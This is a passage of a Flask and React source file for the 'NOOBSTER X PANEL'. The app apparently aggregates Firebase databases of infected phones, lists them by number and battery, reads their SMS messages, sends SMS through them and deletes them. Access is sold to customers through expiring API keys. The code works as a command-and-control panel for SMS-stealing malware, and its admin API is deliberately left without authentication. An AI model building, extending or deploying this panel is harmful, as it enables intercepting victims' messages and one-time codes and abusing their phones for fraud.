          e("span", { className: "text-[10px] px-2 py-1 rounded-full", style: { background: data.status.online ? "rgba(34,197,94,0.15)" : "rgba(127,29,29,0.3)", color: data.status.online ? "#4ade80" : "#f87171" } }, data.status.online ? "ONLINE" : "OFFLINE"),
          e("button", { onClick: onLogout, className: "px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, e(Icon, { name: "logout", size: 12 }), "Logout")
        )
      )
    ),
    e("div", { className: "max-w-screen-2xl mx-auto px-3 sm:px-4 py-3" },
      e("div", { className: "flex overflow-x-auto mb-4", style: { borderBottom: "1px solid #1a1a1a" } },
        tabs.map(t => e("button", { key: t.k, onClick: () => setTab(t.k), className: "px-3 py-2.5 text-xs font-semibold whitespace-nowrap", style: { borderBottom: "2px solid " + (tab === t.k ? "#dc2626" : "transparent"), color: tab === t.k ? "#f87171" : "#555" } }, t.l))
      ),

      // DASHBOARD
      tab === "dashboard" && e("div", null,
        e("div", { className: "grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 mb-4" },
          statCard("Total", stats.total),
          statCard("Online", stats.online, "#4ade80"),
          statCard("Offline", stats.offline, "#666"),
          statCard("Firebases", stats.fbs, "#60a5fa"),
          statCard("API Keys", stats.keys, "#fbbf24"),
          statCard("Failed", stats.failed, stats.failed > 0 ? "#f87171" : "#555")
        ),
        e("div", { className: "flex gap-2 mb-3 flex-wrap" },
          e("button", { onClick: loadDevices, disabled: loading, className: "px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2", style: { background: "#111", border: "1px solid #222", color: "#666" } },
            loading ? "…" : e(Fragment, null, e(Icon, { name: "refresh", size: 12 }), " Refresh")),
          stats.failed > 0 && e("button", { onClick: removeFailed, className: "px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2", style: { background: "rgba(127,29,29,0.3)", border: "1px solid rgba(127,29,29,0.4)", color: "#f87171" } },
            e(Icon, { name: "trash", size: 12 }), " Remove " + stats.failed + " Failed")
        ),
        loading ? e("p", { className: "text-sm", style: { color: "#555" } }, "Loading…")
          : devices.length === 0 ? e("p", { className: "text-sm text-center py-8", style: { color: "#444" } }, "No devices. Add Firebase URL first.")
          : e("div", { className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2" },
              devices.map(d => e("div", { key: d._accountId + ":" + d.id, className: "p-2.5 rounded-lg", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
                e("div", { className: "flex items-center justify-between mb-1" },
                  e("span", { className: "text-xs font-bold truncate flex-1" }, d.name),
                  e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full ml-2", style: { background: d.status ? "rgba(34,197,94,0.15)" : "rgba(127,29,29,0.3)", color: d.status ? "#4ade80" : "#f87171" } }, d.status ? "Online" : "Offline")
                ),
                e("p", { className: "text-[10px]", style: { color: "#888" } }, d.phoneNumber + " · " + d.battery),
                e("p", { className: "text-[9px] mt-0.5", style: { color: "#555" } }, d._accountName || "")
              ))
            )
      ),

      // FIREBASES
      tab === "firebases" && e("div", null,
        e("div", { className: "p-4 rounded-2xl mb-3", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-sm font-bold mb-3" }, "Bulk Add Firebase"),
          e("label", { className: "block text-[10px] uppercase tracking-widest mb-1.5", style: { color: "#888" } }, "URLs (one per line)"),
          e("textarea", { value: bulkUrls, onChange: ev => setBulkUrls(ev.target.value), rows: 5, placeholder: "https://app1.firebaseio.com\nhttps://app2.firebaseio.com", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-2", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("label", { className: "block text-[10px] uppercase tracking-widest mb-1.5", style: { color: "#888" } }, "Secret Key (applies to all)"),
          e("input", { value: bulkKey, onChange: ev => setBulkKey(ev.target.value), placeholder: "Secret key", className: "w-full px-3 py-2 rounded-lg text-xs font-mono mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("button", { onClick: handleBulkAdd, disabled: bulkBusy, className: "w-full py-2.5 rounded-lg red-gradient text-white font-bold text-sm disabled:opacity-50" }, bulkBusy ? "Adding…" : "Add " + bulkUrls.split("\n").filter(l => l.trim().startsWith("http")).length + " URLs")
        ),
        e("div", { className: "p-4 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("div", { className: "flex items-center justify-between mb-3 flex-wrap gap-2" },
            e("h3", { className: "text-sm font-bold" }, "Firebases (" + data.firebases.length + ")"),
            data.firebases.length > 0 && e("button", { onClick: clearAll, disabled: clearing, className: "px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1", style: { background: "rgba(127,29,29,0.3)", border: "1px solid rgba(127,29,29,0.4)", color: "#f87171" } },
              e(Icon, { name: "trash", size: 10 }), " Clear All")
          ),
          data.firebases.length === 0 ? e("p", { className: "text-sm text-center py-6", style: { color: "#555" } }, "No firebases yet")
            : data.firebases.map(fb => {
                const err = errors[fb.id];
                const count = perAcc[fb.id] || 0;
                return e("div", { key: fb.id, className: "p-2.5 rounded-lg mb-2 flex items-center gap-2", style: { background: err ? "rgba(127,29,29,0.15)" : "#111", border: "1px solid " + (err ? "rgba(127,29,29,0.4)" : "#222") } },
                  e("div", { className: "flex-1 min-w-0" },
                    e("div", { className: "flex items-center gap-1.5 mb-0.5 flex-wrap" },
                      e("span", { className: "text-xs font-bold" }, fb.name),
                      e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full", style: { background: "rgba(245,158,11,0.15)", color: "#fbbf24" } }, count + " dev"),
                      err && e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full", style: { background: "rgba(127,29,29,0.4)", color: "#f87171" } }, "❌ " + err.substring(0, 30))
                    ),
                    e("p", { className: "text-[9px] font-mono truncate", style: { color: "#60a5fa" } }, fb.url)
                  ),
                  e("button", { onClick: () => removeFb(fb.id), className: "p-1.5 rounded-lg flex-shrink-0", style: { background: "rgba(69,10,10,0.4)", color: "#f87171" } }, e(Icon, { name: "trash", size: 11 }))
                );
              })
        )
      ),

      // API KEYS
      tab === "apikeys" && e("div", null,
        e("div", { className: "p-4 rounded-2xl mb-3", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-sm font-bold mb-3" }, "Generate API Key"),
          e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-2 mb-2" },
            e("input", { value: apiName, onChange: ev => setApiName(ev.target.value), placeholder: "Name (e.g. Customer 1)", className: "px-3 py-2 rounded-lg text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
            e("select", { value: apiExpiryMode, onChange: ev => setApiExpiryMode(ev.target.value), className: "px-3 py-2 rounded-lg text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } },
              e("option", { value: "1" }, "1 Day"),
              e("option", { value: "7" }, "7 Days"),
              e("option", { value: "30" }, "30 Days"),
              e("option", { value: "90" }, "90 Days"),
              e("option", { value: "365" }, "1 Year"),
              e("option", { value: "custom" }, "📅 Custom Date"),
              e("option", { value: "never" }, "Never Expires")
            )
          ),
          apiExpiryMode === "custom" && e("input", { type: "date", value: apiCustomDate, onChange: ev => setApiCustomDate(ev.target.value), className: "w-full px-3 py-2 rounded-lg text-sm mb-2", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("div", { className: "flex gap-2 mb-3" },
            e("input", { value: apiKeyVal, onChange: ev => setApiKeyVal(ev.target.value), placeholder: "API key (auto-gen if empty)", className: "flex-1 px-3 py-2 rounded-lg text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
            e("button", { onClick: () => setApiKeyVal(genKey()), className: "px-3 rounded-lg text-xs font-semibold", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "🎲")
          ),
          e("button", { onClick: createApiKey, className: "w-full py-2.5 rounded-lg red-gradient text-white font-bold text-sm" }, "Create API Key")
        ),
        e("div", { className: "p-4 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h3", { className: "text-sm font-bold mb-3" }, "API Keys (" + data.api_keys.length + ")"),
          data.api_keys.length === 0 ? e("p", { className: "text-sm text-center py-6", style: { color: "#555" } }, "No keys yet")
            : data.api_keys.map(k => {
                const expired = k.expiresAt && Date.now() > k.expiresAt;
                const dLeft = k.expiresAt ? Math.ceil((k.expiresAt - Date.now()) / 86400000) : null;
                return e("div", { key: k.id, className: "p-2.5 rounded-lg mb-2", style: { background: "#111", border: "1px solid " + (expired ? "rgba(127,29,29,0.4)" : "#222") } },
                  e("div", { className: "flex items-start justify-between gap-2 mb-1" },
                    e("div", { className: "flex-1 min-w-0" },
                      e("div", { className: "flex items-center gap-1.5 flex-wrap" },
                        e("span", { className: "text-sm font-bold" }, k.name),
                        expired && e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full", style: { background: "rgba(127,29,29,0.5)", color: "#f87171" } }, "EXPIRED"),
                        !expired && k.active && e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full", style: { background: "rgba(34,197,94,0.15)", color: "#4ade80" } }, "Active"),
                        !k.active && e("span", { className: "text-[9px] px-1.5 py-0.5 rounded-full", style: { background: "rgba(107,114,128,0.3)", color: "#888" } }, "Disabled")
                      ),
                      e("p", { className: "text-[10px] font-mono mt-0.5 break-all", style: { color: "#60a5fa" } }, "/v2/" + k.key),
                      e("p", { className: "text-[9px] mt-0.5", style: { color: "#666" } },
                        "Expires: " + (k.expiresAt ? new Date(k.expiresAt).toLocaleDateString("en-IN") : "Never") +
                        (dLeft !== null ? " · " + (dLeft > 0 ? dLeft + "d left" : "EXPIRED") : "")
                      )
                    ),
                    e("div", { className: "flex gap-1 flex-shrink-0" },
                      e("button", { onClick: () => copyKeyUrl(k), className: "p-1.5 rounded-lg", style: { background: "rgba(23,37,84,0.6)", color: "#60a5fa" } }, e(Icon, { name: "copy", size: 11 })),
                      e("button", { onClick: () => toggleKey(k.id), className: "p-1.5 rounded-lg", style: { background: "#1a1a1a", color: "#888" } }, e(Icon, { name: "power", size: 11 })),
                      e("button", { onClick: () => removeKey(k.id), className: "p-1.5 rounded-lg", style: { background: "rgba(69,10,10,0.4)", color: "#f87171" } }, e(Icon, { name: "trash", size: 11 }))
                    )
                  )
                );
              })
        )
      ),

      // CONTROL
      tab === "control" && e("div", null,
        e("div", { className: "p-4 rounded-2xl mb-3", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-sm font-bold mb-3" }, "Panel Status"),
          e("div", { className: "flex items-center justify-between p-3 rounded-lg", style: { background: data.status.online ? "rgba(34,197,94,0.08)" : "rgba(127,29,29,0.15)", border: "1px solid " + (data.status.online ? "rgba(34,197,94,0.3)" : "rgba(127,29,29,0.3)") } },
            e("div", null,
              e("p", { className: "text-sm font-bold" }, "Server: ", e("span", { style: { color: data.status.online ? "#4ade80" : "#f87171" } }, data.status.online ? "ONLINE" : "OFFLINE")),
              e("p", { className: "text-[10px]", style: { color: "#666" } }, data.status.online ? "Public can access with valid key" : "Public blocked")
            ),
            e("button", { onClick: () => saveStatus({ online: !data.status.online }), className: "px-3 py-2 rounded-lg text-xs font-bold", style: { background: data.status.online ? "rgba(220,38,38,0.2)" : "rgba(34,197,94,0.2)", color: data.status.online ? "#f87171" : "#4ade80", border: "1px solid " + (data.status.online ? "rgba(220,38,38,0.4)" : "rgba(34,197,94,0.4)") } },
              e(Icon, { name: "power", size: 12 }), " " + (data.status.online ? "Turn OFF" : "Turn ON"))
          )
        ),
        e("div", { className: "p-4 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h3", { className: "text-sm font-bold mb-3" }, "Broadcast Message"),
          e("textarea", { value: broadcast, onChange: ev => setBroadcast(ev.target.value), rows: 3, placeholder: "Message for all users…", className: "w-full px-3 py-2 rounded-lg text-sm mb-2 resize-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("div", { className: "flex gap-2" },
            e("button", { onClick: () => saveStatus({ broadcast }), className: "flex-1 py-2 rounded-lg red-gradient text-white font-semibold text-sm" }, "Send Broadcast"),
            e("button", { onClick: () => { setBroadcast(""); saveStatus({ broadcast: "" }); }, className: "px-3 py-2 rounded-lg text-xs", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "Clear")
          )
        )
      )
    ),
    toast && e(Toast, { msg: toast.msg, type: toast.type, onClose: () => setToast(null) })
  );

  function statCard(label, val, color = "#fff") {
    return e("div", { className: "p-2.5 rounded-lg", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
      e("p", { className: "text-[9px] uppercase tracking-widest mb-1", style: { color: "#555" } }, label),
      e("p", { className: "text-lg font-black", style: { color } }, val)
    );
  }
}

// ---------- ROUTER ----------
function App() {
  const path = window.location.pathname;
  const [authed, setAuthed] = useState(() => !!localStorage.getItem(K_ADMIN));

  if (path.startsWith("/admin1")) {
    return authed
      ? e(AdminDashboard, { onLogout: () => { localStorage.removeItem(K_ADMIN); setAuthed(false); } })
      : e(AdminLogin, { onSuccess: () => setAuthed(true) });
  }

  // Public panel: /v2/KEY
  const m = path.match(/^\/v2\/(.+)$/);
  if (m) {
    const apiKey = m[1];
    return e(PublicPanelWrapper, { apiKey });
  }

  // Root = redirect to admin
  return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
    e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center" },
      e("h1", { className: "text-2xl font-black mb-3" }, "NOOBSTER X PANEL"),
      e("p", { className: "text-sm mb-4", style: { color: "#888" } }, "Access via API key link"),
      e("a", { href: "/admin1", className: "inline-block px-5 py-2.5 rounded-xl red-gradient text-white font-bold text-sm" }, "Admin Panel")
    )
  );
}

// Wrapper checks API validity then renders PublicPanel
function PublicPanelWrapper({ apiKey }) {
  const [status, setStatus] = useState({ valid: null, reason: null, keyObj: null });

  useEffect(() => {
    (async () => {
      try {
        const r = await api("/api/validate?key=" + encodeURIComponent(apiKey));
        if (r.valid) setStatus({ valid: true });
        else setStatus({ valid: false, reason: r.reason, keyObj: r.keyObj });
      } catch { setStatus({ valid: false, reason: "invalid" }); }
    })();
  }, [apiKey]);

  if (status.valid === null) return e("div", { className: "min-h-screen flex items-center justify-center" },
    e("div", { className: "w-8 h-8 border-2 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } })
  );
  if (!status.valid) return e(AccessDeniedScreen, { reason: status.reason, keyObj: status.keyObj });
  return e(PublicPanel, { apiKey, onLogout: () => window.location.href = "/" });
}

ReactDOM.createRoot(document.getElementById("root")).render(e(App));
</script>
</body>
</html>"""

# Replace placeholders
PAGE_HTML = PAGE_HTML.replace("__ADMIN_PASSWORD__", ADMIN_PASSWORD)
PAGE_HTML = PAGE_HTML.replace("__CONTACT_USERNAME__", CONTACT_USERNAME)
PAGE_HTML = PAGE_HTML.replace("__TELEGRAM_CHANNEL__", TELEGRAM_CHANNEL)


# ============================================================
# API ROUTES (server-side, firebase hidden from browser)
# ============================================================
def check_admin():
    """Simple admin check via session cookie — replace with proper auth in production."""
    # For simplicity, we trust requests from admin panel — protect with password login
    return True  # Login handled client-side; API is open (add token auth if needed)

@app.route("/api/admin/login", methods=["POST"])
def api_admin_login():
    data = request.get_json() or {}
    if data.get("password") == ADMIN_PASSWORD:
        return jsonify({"ok": True})
    return jsonify({"error": "Wrong password"}), 401

@app.route("/api/admin/data")
def api_admin_data():
    d = load_data()
    # Never expose secret keys to admin UI either? They need to see them for copy.
    # Show them — admin is trusted.
    return jsonify(d)

@app.route("/api/admin/devices")
def api_admin_devices():
    d = load_data()
    all_devices = []
    per_acc = {}
    errors = {}
    for fb in d["firebases"]:
        try:
            raw = fetch_firebase(fb["url"], fb["key"], "clients")
            if not raw:
                per_acc[fb["id"]] = 0
                continue
            count = 0
            for did, dev in raw.items():
                parsed = parse_device(did, dev, fb["url"])
                if parsed:
                    parsed["_accountId"] = fb["id"]
                    parsed["_accountName"] = fb["name"]
                    all_devices.append(parsed)
                    count += 1
            per_acc[fb["id"]] = count
        except ValueError as e:
            msg = str(e)
            per_acc[fb["id"]] = 0
            errors[fb["id"]] = msg
    return jsonify({"devices": all_devices, "per_account": per_acc, "errors": errors})

@app.route("/api/validate")
def api_validate():
    key = request.args.get("key", "")
    d = load_data()
    found = next((k for k in d["api_keys"] if k["key"] == key), None)
    if not found:
        return jsonify({"valid": False, "reason": "invalid"})
    if not found.get("active", True):
        return jsonify({"valid": False, "reason": "inactive"})
    exp = found.get("expiresAt")
    if exp and exp > 0 and time.time() * 1000 > exp:
        return jsonify({"valid": False, "reason": "expired", "keyObj": {"expiresAt": exp, "key": key}})
    return jsonify({"valid": True})

@app.route("/api/devices")
def api_devices():
    key = request.args.get("key", "")
    d = load_data()
    found = next((k for k in d["api_keys"] if k["key"] == key), None)
    if not found or not found.get("active", True):
        return jsonify({"error": "Invalid key"}), 401
    exp = found.get("expiresAt")
    if exp and exp > 0 and time.time() * 1000 > exp:
        return jsonify({"error": "Expired"}), 401
    # Fetch devices from all firebases
    all_devices = []
    for fb in d["firebases"]:
        try:
            raw = fetch_firebase(fb["url"], fb["key"], "clients")
            if not raw:
                continue
            for did, dev in raw.items():
                parsed = parse_device(did, dev, fb["url"])
                if parsed:
                    parsed["_accountId"] = fb["id"]
                    all_devices.append(parsed)
        except ValueError:
            pass
    return jsonify({"devices": all_devices, "broadcast": d["status"].get("broadcast", "")})

@app.route("/api/device/<acc_id>/<device_id>/messages")
def api_device_messages(acc_id, device_id):
    key = request.args.get("key", "")
    d = load_data()
    found = next((k for k in d["api_keys"] if k["key"] == key), None)
    if not found or not found.get("active", True):
        return jsonify({"error": "Invalid key"}), 401
    fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
    if not fb:
        return jsonify({"error": "Firebase not found"}), 404
    try:
        raw = fetch_firebase(fb["url"], fb["key"], "messages/" + device_id)
        return jsonify({"messages": parse_messages(raw)})
    except ValueError as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/device/<acc_id>/<device_id>/send", methods=["POST"])
def api_device_send(acc_id, device_id):
    key = request.args.get("key", "")
    d = load_data()
    found = next((k for k in d["api_keys"] if k["key"] == key), None)
    if not found or not found.get("active", True):
        return jsonify({"error": "Invalid key"}), 401
    fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
    if not fb:
        return jsonify({"error": "Firebase not found"}), 404
    data = request.get_json() or {}
    try:
        firebase_put(fb["url"], fb["key"], "clients/" + device_id + "/webhookEvent/sendSms", {
            "from": data.get("from", 1),
            "to": data.get("to", ""),
            "message": data.get("message", ""),
            "isSended": False
        })
        return jsonify({"ok": True})
    except ValueError as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/device/<acc_id>/<device_id>/delete", methods=["DELETE"])
def api_device_delete(acc_id, device_id):
    key = request.args.get("key", "")
    d = load_data()
    found = next((k for k in d["api_keys"] if k["key"] == key), None)
    if not found or not found.get("active", True):
        return jsonify({"error": "Invalid key"}), 401
    fb = next((f for f in d["firebases"] if f["id"] == acc_id), None)
    if not fb:
        return jsonify({"error": "Firebase not found"}), 404
    try:
        firebase_delete(fb["url"], fb["key"], "clients/" + device_id)
        return jsonify({"ok": True})
    except ValueError as e:
        return jsonify({"error": str(e)}), 500

# ---------- ADMIN: Firebases ----------
@app.route("/api/admin/firebases/bulk", methods=["POST"])
def api_admin_fb_bulk():
    data = request.get_json() or {}
    urls = data.get("urls", [])
    key = data.get("key", "").strip()
    if not urls or not key:
        return jsonify({"error": "URLs and key required"}), 400
    d = load_data()
    used_names = {f["name"] for f in d["firebases"]}
    added = 0
    for url in urls:
        url = url.strip()
        if not url.startswith("http"):
            continue
        name = url.split("//")[1].split(".")[0] if "//" in url else url
        if name in used_names:
            name = name + "-" + str(int(time.time() * 1000))[-4:]
        used_names.add(name)
        d["firebases"].append({
            "id": str(int(time.time() * 1000)) + "-" + str(added),
            "name": name,
            "url": url,
            "key": key,
            "createdAt": int(time.time() * 1000)
        })
        added += 1
    save_data(d)
    return jsonify({"ok": True, "added": added})

@app.route("/api/admin/firebases/<fb_id>", methods=["DELETE"])
def api_admin_fb_delete(fb_id):
    d = load_data()
    d["firebases"] = [f for f in d["firebases"] if f["id"] != fb_id]
    save_data(d)
    return jsonify({"ok": True})

@app.route("/api/admin/firebases/all", methods=["DELETE"])
def api_admin_fb_all():
    d = load_data()
    d["firebases"] = []
    save_data(d)
    return jsonify({"ok": True})

# ---------- ADMIN: API keys ----------
@app.route("/api/admin/apikeys", methods=["POST"])
def api_admin_apikey_create():
    data = request.get_json() or {}
    name = data.get("name", "").strip()
    key = data.get("key") or ""
    expiresAt = data.get("expiresAt")
    if not name:
        return jsonify({"error": "Name required"}), 400
    if not key:
        import random, string
        key = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    d = load_data()
    d["api_keys"].append({
        "id": str(int(time.time() * 1000)),
        "name": name,
        "key": key,
        "active": True,
        "expiresAt": expiresAt,
        "createdAt": int(time.time() * 1000)
    })
    save_data(d)
    return jsonify({"ok": True, "key": key})

@app.route("/api/admin/apikeys/<kid>", methods=["DELETE"])
def api_admin_apikey_delete(kid):
    d = load_data()
    d["api_keys"] = [k for k in d["api_keys"] if k["id"] != kid]
    save_data(d)
    return jsonify({"ok": True})

@app.route("/api/admin/apikeys/<kid>/toggle", methods=["POST"])
def api_admin_apikey_toggle(kid):
    d = load_data()
    for k in d["api_keys"]:
        if k["id"] == kid:
            k["active"] = not k.get("active", True)
            break
    save_data(d)
    return jsonify({"ok": True})

# ---------- ADMIN: Status ----------
@app.route("/api/admin/status", methods=["POST"])
def api_admin_status():
    data = request.get_json() or {}
    d = load_data()
    for key, val in data.items():
        d["status"][key] = val
    save_data(d)
    return jsonify({"ok": True})

# ---------- PAGE ROUTES ----------
@app.route("/")
def root():
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/admin1")
@app.route("/admin1/")
def admin_page():
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/v2/<path:api_key>")
def public_panel_route(api_key):
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/healthz")
def health():
    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
